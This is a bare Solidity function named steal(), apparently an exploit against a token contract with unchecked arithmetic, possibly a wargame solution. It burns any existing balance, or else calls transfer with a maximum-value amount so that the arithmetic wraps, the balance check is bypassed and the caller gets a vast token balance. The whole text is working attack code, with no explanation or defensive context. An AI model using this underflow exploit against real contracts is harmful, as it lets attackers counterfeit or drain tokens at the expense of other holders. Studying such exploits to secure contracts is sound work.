function steal() public returns (bool) {
        Token t = Token(TOKEN_CONTRACT);
        
        uint senderBalance = t.balanceOf(msg.sender);
        
        if (senderBalance > 0) {
            t.transfer(address(0), senderBalance); // Burn starting tokens
        } else {
            t.transfer(msg.sender, UINT_MAX_CAPACITY); // Overflow uint so that the require check equals 0
        }
        
        return true;
    }